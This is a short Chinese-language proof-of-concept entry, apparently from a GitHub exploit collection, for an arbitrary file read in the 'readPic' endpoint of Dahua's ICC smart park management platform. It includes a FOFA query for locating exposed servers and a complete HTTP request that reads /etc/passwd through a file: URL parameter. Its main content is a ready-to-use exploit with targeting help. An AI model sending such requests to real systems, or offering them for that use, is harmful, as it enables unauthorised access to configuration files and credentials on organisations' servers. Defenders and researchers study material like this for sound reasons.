
## 大华智能物联ICC综合管理平台readpic任意文件读取漏洞
大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。该平台的 "readpic" 接口存在一个任意文件读取漏洞，恶意攻击者可通过文件读取漏洞进行访问和读取系统中的文件，包括配置文件、日志和其他敏感数据，从而利用攻击。

## fofa
```
:body="*客户端会小于800*"
```

## poc
```
GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd HTTP/2
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-None-Match: W/"63ba2750-93e"
Te: trailers
```

![be62ca49838833e8b7527d0ab2dd5541](https://github.com/wy876/POC/assets/139549762/25cb6acd-b1bc-4012-a52e-92356d47ada5)
